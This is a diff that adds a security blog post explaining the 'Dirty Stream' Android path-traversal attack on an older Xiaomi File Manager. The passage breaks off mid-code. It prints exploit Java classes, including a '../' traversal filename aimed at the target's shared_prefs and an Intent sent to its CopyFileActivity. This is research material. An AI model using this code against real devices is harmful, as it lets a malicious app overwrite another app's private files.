@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    <title>
+Dirty Stream: Exploiting Android&#39;s File Sharing - Part 1 | gelosecurity
+</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="gelo&#39;s security blog">
+
+<meta name="generator" content="Hugo 0.145.0">
+
+
+<link rel="canonical" href="https://gelosecurity.github.io/posts/dirty-stream-pt1/" >
+
+
+
+
+<link href="/css/style.min.3651cb95c72ce13c6a5cbb9a059fc4da0014d2580cb70d8f507f4bb73954293a.css" rel="stylesheet">
+
+
+
+
+</head>
+
+<body>
+
+    <div class="flexWrapper">
+        <header class="headerWrapper">
+    <div class="header">
+        <div>
+            <a class="terminal" href="/">
+                <span>root@gelo.gg ~ $</span>
+            </a>
+        </div>
+        <input class="side-menu" type="checkbox" id="side-menu">
+        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
+        <nav class="headerLinks">
+            <ul>
+                
+                <li>
+                    <a href="https://gelosecurity.github.io/about" title="" >
+                        ~/about</a>
+                </li>
+                
+                <li>
+                    <a href="https://gelosecurity.github.io/posts" title="" >
+                        ~/blog</a>
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper">
+    <h1>Dirty Stream: Exploiting Android&#39;s File Sharing - Part 1</h1>
+    
+    
+    <section class="postMetadata">
+        <dl>
+            
+                
+<dt>tags</dt>
+<dd><span></span>
+    <a href="/tags/android/">#Android</a><span></span>
+    <a href="/tags/mobile-security/">#Mobile Security</a></dd>
+            
+            
+            
+            
+                <dt>published</dt>
+                
+                <dd><time datetime="2025-03-05">March 5, 2025</time></dd>
+            
+            
+                <dt>reading time</dt>
+                <dd>8 minutes</dd>
+            
+        </dl>
+    </section>
+    
+    <div>
+        <h2 id="dirty-stream-exploiting-androids-file-sharing---part-1">Dirty Stream: Exploiting Android&rsquo;s File Sharing - Part 1</h2>
+<p>&ldquo;Dirty Stream&rdquo;. This attack, detailed by <a href="https://www.microsoft.com/en-us/security/blog/2024/05/01/dirty-stream-attack-discovering-and-mitigating-a-common-vulnerability-pattern-in-android-apps/">Microsoft&rsquo;s Threat Intelligence team</a>, highlights a common vulnerability pattern related to improper handling of file sharing via <code>ContentProvider</code>s. I&rsquo;d like to thank <a href="https://x.com/Ch0pin">Ch0pin</a> for his excellent articles, presentations, and research on Android security, and to cyb3r-w0lf and LLeavesG for their initial PoC skeletons.</p>
+<p>This blog post, the first in a series, will walk you through my journey of understanding and exploiting this vulnerability. We&rsquo;ll start with a &ldquo;defanged&rdquo; proof-of-concept (PoC), debug it, and get it working, demonstrating the core principles behind the Dirty Stream attack. In later posts, we&rsquo;ll explore advanced exploitation techniques and discuss robust mitigation strategies to help secure vulnerable applications.</p>
+<h3 id="what-is-the-dirty-stream-attack">What is the Dirty Stream Attack?</h3>
+<p>The Dirty Stream attack, as documented by Microsoft, exploits path traversal vulnerabilities in Android applications. It targets apps that insecurely handle file sharing through <code>ContentProvider</code>. The attack allows a malicious app to overwrite files in the private data directory of a vulnerable (target) application. This can lead to several severe consequences, including:</p>
+<ul>
+<li><strong>Arbitrary Code Execution (ACE):</strong> Overwriting shared libraries (.so files) to potentially gain control over app execution.</li>
+<li><strong>Data Modification:</strong> Altering application preferences or databases to change app behavior.</li>
+<li><strong>Denial of Service:</strong> Corrupting critical files, which may cause application crashes or unexpected behavior.</li>
+</ul>
+<p>The vulnerability arises from the way the target app requests and uses filenames from the attacking app&rsquo;s <code>ContentProvider</code> without proper sanitization, allowing for dangerous path traversal.</p>
+<h3 id="the-starting-point-a-defanged-poc">The Starting Point: A Defanged PoC</h3>
+<p>I began by exploring existing PoC code available on GitHub:</p>
+<ul>
+<li><a href="https://github.com/cyb3r-w0lf/Dirty_Stream-Android-POC">cyb3r-w0lf/Dirty_Stream-Android-POC</a> (Original, defanged)</li>
+<li><a href="https://github.com/LLeavesG/Android-DirtyStream">LLeavesG/Android-DirtyStream</a> (Alternative approach, which required further adjustments)</li>
+</ul>
+<p>My initial goal was to understand how the exploit worked. The original PoC by cyb3r-w0lf was &ldquo;defanged&rdquo; – it wouldn’t actually write to the target&rsquo;s directory.</p>
+<p>Here is a working PoC that will be discussed in the blog post:</p>
+<ul>
+<li><a href="https://github.com/gelosecurity/Dirty_Stream-Android-POC">gelosecurity/Dirty_Stream-Android-POC</a></li>
+</ul>
+<h3 id="the-test-environment">The Test Environment</h3>
+<p>To safely test the exploit, I used the following setup:</p>
+<ul>
+<li><strong>Development Environment:</strong> Android Studio</li>
+<li><strong>Deployment Tool:</strong> adb (Android Debug Bridge)</li>
+<li><strong>Target Device:</strong> A rooted Google Pixel 3 running Android 15.0.0 (via Corellium)</li>
+<li><strong>Vulnerable App:</strong> An older version (V1-210567) of Xiaomi Inc.&rsquo;s File Manager, which is known to be vulnerable.</li>
+</ul>
+<h3 id="step-1-understanding-the-original-poc">Step 1: Understanding the Original PoC</h3>
+<p>The original PoC consists of three main Java files:</p>
+<ol>
+<li>
+<p><strong><code>DatabaseHelper.java</code>:</strong><br>
+This class extends <code>SQLiteOpenHelper</code> and sets up a SQLite database. It defines a table named <code>exploitTable</code> with columns <code>size</code>, <code>display_name</code>, and <code>_data</code>. The <code>insertExploitData</code> method inserts a row containing the malicious path (using directory traversal) and placeholder data. Note that the vulnerable app expects the <code>_data</code> and <code>_size</code> columns.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.fileexplorer.exploit;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.content.Context;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.database.sqlite.SQLiteDatabase;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.database.sqlite.SQLiteOpenHelper;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.util.Log;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseHelper</span> <span style="color:#66d9ef">extends</span> SQLiteOpenHelper {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String DATABASE_NAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;exploitDB&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> DATABASE_VERSION <span style="color:#f92672">=</span> 1;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">DatabaseHelper</span>(Context context) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>(context, DATABASE_NAME, <span style="color:#66d9ef">null</span>, DATABASE_VERSION);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onCreate</span>(SQLiteDatabase db) {
+</span></span><span style="display:flex;"><span>        db.<span style="color:#a6e22e">execSQL</span>(<span style="color:#e6db74">&#34;CREATE TABLE IF NOT EXISTS exploitTable (size INTEGER, display_name TEXT, _data TEXT);&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onUpgrade</span>(SQLiteDatabase db, <span style="color:#66d9ef">int</span> oldVersion, <span style="color:#66d9ef">int</span> newVersion) {
+</span></span><span style="display:flex;"><span>        db.<span style="color:#a6e22e">execSQL</span>(<span style="color:#e6db74">&#34;DROP TABLE IF EXISTS exploitTable&#34;</span>);
+</span></span><span style="display:flex;"><span>        onCreate(db);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">insertExploitData</span>() {
+</span></span><span style="display:flex;"><span>        SQLiteDatabase db <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getWritableDatabase</span>();
+</span></span><span style="display:flex;"><span>        db.<span style="color:#a6e22e">execSQL</span>(<span style="color:#e6db74">&#34;INSERT INTO exploitTable (size, display_name, _data) VALUES (12345, &#39;../../../../../../../../../../data/data/com.mi.android.globalFileexplorer/shared_prefs/pwned.txt&#39;, &#39;exploit_data&#39;);&#34;</span>);
+</span></span><span style="display:flex;"><span>        Log.<span style="color:#a6e22e">d</span>(<span style="color:#e6db74">&#34;DatabaseHelper&#34;</span>, <span style="color:#e6db74">&#34;Inserted exploit data&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+<li>
+<p><strong><code>MainActivity.java</code>:</strong><br>
+The main activity sets up a button that, when clicked, triggers the exploit. It copies a file (<code>pwned.txt</code>) to the app&rsquo;s internal storage, inserts the malicious data into the database, and constructs an <code>Intent</code> targeting the vulnerable activity in Xiaomi File Manager.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.fileexplorer.exploit;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.content.ComponentName;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.content.Intent;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.net.Uri;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.os.Bundle;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> androidx.appcompat.app.AppCompatActivity;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.util.Log;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.widget.Button;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.File;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.InputStream;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MainActivity</span> <span style="color:#66d9ef">extends</span> AppCompatActivity {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onCreate</span>(Bundle savedInstanceState) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">onCreate</span>(savedInstanceState);
+</span></span><span style="display:flex;"><span>        setContentView(R.<span style="color:#a6e22e">layout</span>.<span style="color:#a6e22e">activity_main</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Button button <span style="color:#f92672">=</span> findViewById(R.<span style="color:#a6e22e">id</span>.<span style="color:#a6e22e">exploit</span>);
+</span></span><span style="display:flex;"><span>        button.<span style="color:#a6e22e">setOnClickListener</span>(view <span style="color:#f92672">-&gt;</span> setupDatabaseAndIntent());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setupDatabaseAndIntent</span>() {
+</span></span><span style="display:flex;"><span>        copyFileToInternalStorage();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        DatabaseHelper dbHelper <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> DatabaseHelper(<span style="color:#66d9ef">this</span>);
+</span></span><span style="display:flex;"><span>        dbHelper.<span style="color:#a6e22e">insertExploitData</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Uri uri <span style="color:#f92672">=</span> Uri.<span style="color:#a6e22e">parse</span>(<span style="color:#e6db74">&#34;content://com.fileexplorer.exploit/pwned.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>        Intent intent <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Intent();
+</span></span><span style="display:flex;"><span>        intent.<span style="color:#a6e22e">setComponent</span>(<span style="color:#66d9ef">new</span> ComponentName(<span style="color:#e6db74">&#34;com.mi.android.globalFileexplorer&#34;</span>, <span style="color:#e6db74">&#34;com.android.fileexplorer.activity.CopyFileActivity&#34;</span>));
+</span></span><span style="display:flex;"><span>        intent.<span style="color:#a6e22e">putExtra</span>(<span style="color:#e6db74">&#34;from_private&#34;</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        intent.<span style="color:#a6e22e">putExtra</span>(<span style="color:#e6db74">&#34;inner_call&#34;</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        intent.<span style="color:#a6e22e">putExtra</span>(<span style="color:#e6db74">&#34;explorer_path&#34;</span>, <span style="color:#e6db74">&#34;content://com.fileexplorer.exploit/pwned.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>        intent.<span style="color:#a6e22e">setData</span>(uri);
+</span></span><span style="display:flex;"><span>        intent.<span style="color:#a6e22e">setAction</span>(Intent.<span style="color:#a6e22e">ACTION_SEND</span>);
+</span></span><span style="display:flex;"><span>        startActivity(intent);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">copyFileToInternalStorage</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            InputStream inputStream <span style="color:#f92672">=</span> getAssets().<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;pwned.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>            File outFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(getFilesDir(), <span style="color:#e6db74">&#34;pwned.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>            FileOutputStream outputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileOutputStream(outFile);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> buffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>1024<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> length;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> ((length <span style="color:#f92672">=</span> inputStream.<span style="color:#a6e22e">read</span>(buffer)) <span style="color:#f92672">&gt;</span> 0) {
+</span></span><span style="display:flex;"><span>                outputStream.<span style="color:#a6e22e">write</span>(buffer, 0, length);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            outputStream.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>            inputStream.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (IOException e) {
+</span></span><span style="display:flex;"><span>            Log.<span style="color:#a6e22e">e</span>(<span style="color:#e6db74">&#34;MainActivity&#34;</span>, <span style="color:#e6db74">&#34;Error copying file to internal storage&#34;</span>, e);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+<li>
+<p><strong><code>MyContentProvider.java</code>:</strong><br>
+This class extends <code>ContentProvider</code>. The key method, <code>openFile</code>, is designed to serve the file requested via a content URI. The original defanged version simply returns the local <code>pwned.txt</code> file, while the critical <code>query</code> method, which should provide the malicious file path, originally returned <code>null</code>. I skipped over this detail at first glance.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"></code></pre></div></li>
+</ol>
+<p>package com.fileexplorer.exploit;</p>
+<p>import android.content.ContentProvider;
+import android.content.ContentValues;
+import android.database.Cursor;
+import android.database.sqlite.SQLiteDatabase;
+import android.net.Uri;
+import android.os.ParcelFileDescriptor;
+import android.util.Log;</p>
+<p>import java.io.File;
+import java.io.FileNotFoundException;</p>
+<p>public class MyContentProvider extends ContentProvider {
+private DatabaseHelper dbHelper;</p>
+<pre><code>@Override
+public boolean onCreate() {
+    dbHelper = new DatabaseHelper(getContext());
+    return true;
+}
+
+@Override
+public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
+    File file = new File(getContext().getFilesDir(), &quot;pwned.txt&quot;);
+    Log.d(&quot;MyContentProvider&quot;, &quot;File path: &quot; + file.getAbsolutePath());
+    if (!file.exists()) {
+        throw new FileNotFoundException(&quot;File not found: &quot; + file.getAbsolutePath());
+    }
+    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
+}
+
+@Override
+public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
+    return null;
+}
+
+@Override
+public String getType(Uri uri) {
+    return null;
+}
+
+@Override
+public Uri insert(Uri uri, ContentValues values) {
+    return null;
+}
+
+@Override
+public int delete(Uri uri, String selection, String[] selectionArgs) {
+    return 0;
+}
+
+@Override
+public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
+    return 0;
+}
+</code></pre>
+<p>}
+```</p>
+<h2 id="step-2-dynamic-testing-and-refinement">Step 2: Dynamic Testing and Refinement</h2>
+<p>After building and installing the APK on a Corellium virtual device, I launched the app and clicked the &ldquo;Exploit&rdquo; button. Initially, with the original code, no changes occurred.</p>
+<p>&lt;GIF PLACEHOLDER&gt;</p>
+<h2 id="step-3-debugging-and-logging">Step 3: Debugging and Logging</h2>
+<p>To better understand the behavior of each component, I added extensive logging using <code>Log.d()</code>. This allowed me to monitor method calls and inspect the values being processed. Such visibility is crucial in debugging security exploits and verifying each stage of the attack chain. An example with <code>MainActivity.java</code> is shown here, with the use of a <code>TAG</code> for Logcat and <code>Log.d()</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.fileexplorer.exploit;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.content.ComponentName;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.content.Intent;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.net.Uri;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.os.Bundle;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> androidx.appcompat.app.AppCompatActivity;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.util.Log;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.widget.Button;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.File;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.InputStream;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MainActivity</span> <span style="color:#66d9ef">extends</span> AppCompatActivity {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String TAG <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;MainActivity&#34;</span>; <span style="color:#75715e">// Tag for Logcat</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onCreate</span>(Bundle savedInstanceState) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">onCreate</span>(savedInstanceState);
+</span></span><span style="display:flex;"><span>        Log.<span style="color:#a6e22e">d</span>(TAG, <span style="color:#e6db74">&#34;onCreate called&#34;</span>); <span style="color:#75715e">// Log activity creation</span>
+</span></span><span style="display:flex;"><span>        setContentView(R.<span style="color:#a6e22e">layout</span>.<span style="color:#a6e22e">activity_main</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Button button <span style="color:#f92672">=</span> findViewById(R.<span style="color:#a6e22e">id</span>.<span style="color:#a6e22e">exploit</span>);
+</span></span><span style="display:flex;"><span>        button.<span style="color:#a6e22e">setOnClickListener</span>(view <span style="color:#f92672">-&gt;</span> {
+</span></span><span style="display:flex;"><span>            Log.<span style="color:#a6e22e">d</span>(TAG, <span style="color:#e6db74">&#34;Exploit button clicked&#34;</span>); <span style="color:#75715e">// Log button click</span>
+</span></span><span style="display:flex;"><span>            setupDatabaseAndIntent();
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setupDatabaseAndIntent</span>() {
+</span></span><span style="display:flex;"><span>        Log.<span style="color:#a6e22e">d</span>(TAG, <span style="color:#e6db74">&#34;setupDatabaseAndIntent called&#34;</span>); <span style="color:#75715e">// Log method entry</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        copyFileToInternalStorage();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        DatabaseHelper dbHelper <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> DatabaseHelper(<span style="color:#66d9ef">this</span>);
+</span></span><span style="display:flex;"><span>        dbHelper.<span style="color:#a6e22e">insertExploitData</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Uri uri <span style="color:#f92672">=</span> Uri.<span style="color:#a6e22e">parse</span>(<span style="color:#e6db74">&#34;content://com.fileexplorer.exploit/pwned.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>        Log.<span style="color:#a6e22e">d</span>(TAG, <span style="color:#e6db74">&#34;URI parsed: &#34;</span> <span style="color:#f92672">+</span> uri.<span style="color:#a6e22e">toString</span>()); <span style="color:#75715e">// Log the parsed URI</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Intent intent <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Intent();
+</span></span><span style="display:flex;"><span>        intent.<span style="color:#a6e22e">setComponent</span>(<span style="color:#66d9ef">new</span> ComponentName(<span style="color:#e6db74">&#34;com.mi.android.globalFileexplorer&#34;</span>, <span style="color:#e6db74">&#34;com.android.fileexplorer.activity.CopyFileActivity&#34;</span>));
+</span></span><span style="display:flex;"><span>        Log.<span style="color:#a6e22e">d</span>(TAG, <span style="color:#e6db74">&#34;Intent component set: &#34;</span> <span style="color:#f92672">+</span> intent.<span style="color:#a6e22e">getComponent</span>().<span style="color:#a6e22e">toString</span>()); <span style="color:#75715e">// Log the component</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        intent.<span style="color:#a6e22e">putExtra</span>(<span style="color:#e6db74">&#34;from_private&#34;</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        intent.<span style="color:#a6e22e">putExtra</span>(<span style="color:#e6db74">&#34;inner_call&#34;</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        intent.<span style="color:#a6e22e">putExtra</span>(<span style="color:#e6db74">&#34;explorer_path&#34;</span>, <span style="color:#e6db74">&#34;content://com.fileexplorer.exploit/pwned.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>        Log.<span style="color:#a6e22e">d</span>(TAG, <span style="color:#e6db74">&#34;Intent extras set&#34;</span>); <span style="color:#75715e">//log that extras have been set.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        intent.<span style="color:#a6e22e">setData</span>(uri);
+</span></span><span style="display:flex;"><span>        intent.<span style="color:#a6e22e">setAction</span>(Intent.<span style="color:#a6e22e">ACTION_SEND</span>);
+</span></span><span style="display:flex;"><span>        Log.<span style="color:#a6e22e">d</span>(TAG, <span style="color:#e6db74">&#34;Intent action and data set&#34;</span>); <span style="color:#75715e">//Log that action and data are set</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            startActivity(intent);
+</span></span><span style="display:flex;"><span>            Log.<span style="color:#a6e22e">d</span>(TAG, <span style="color:#e6db74">&#34;Intent started successfully&#34;</span>); <span style="color:#75715e">// Log successful intent start</span>
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>            Log.<span style="color:#a6e22e">e</span>(TAG, <span style="color:#e6db74">&#34;Failed to start activity: &#34;</span> <span style="color:#f92672">+</span> e.<span style="color:#a6e22e">getMessage</span>(), e); <span style="color:#75715e">// Log any exceptions</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">copyFileToInternalStorage</span>() {
+</span></span><span style="display:flex;"><span>        Log.<span style="color:#a6e22e">d</span>(TAG, <span style="color:#e6db74">&#34;copyFileToInternalStorage called&#34;</span>); <span style="color:#75715e">// Log method entry</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            InputStream inputStream <span style="color:#f92672">=</span> getAssets().<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;pwned.txt&#34;</span>); <span style="color:#75715e">//get from assets directory</span>
+</span></span><span style="display:flex;"><span>            Log.<span style="color:#a6e22e">d</span>(TAG, <span style="color:#e6db74">&#34;Input stream opened from assets&#34;</span>);
+</span></span><span style="display:flex;"><span>            File outFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(getFilesDir(), <span style="color:#e6db74">&#34;pwned.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>            Log.<span style="color:#a6e22e">d</span>(TAG, <span style="color:#e6db74">&#34;Output file path: &#34;</span> <span style="color:#f92672">+</span> outFile.<span style="color:#a6e22e">getAbsolutePath</span>()); <span style="color:#75715e">// Log the output file path</span>
+</span></span><span style="display:flex;"><span>            FileOutputStream outputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileOutputStream(outFile);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> buffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>1024<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> length;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> ((length <span style="color:#f92672">=</span> inputStream.<span style="color:#a6e22e">read</span>(buffer)) <span style="color:#f92672">&gt;</span> 0) {
+</span></span><span style="display:flex;"><span>                outputStream.<span style="color:#a6e22e">write</span>(buffer, 0, length);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            outputStream.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>            inputStream.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>            Log.<span style="color:#a6e22e">d</span>(TAG, <span style="color:#e6db74">&#34;File copied to internal storage successfully&#34;</span>); <span style="color:#75715e">// Log successful file copy</span>
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (IOException e) {
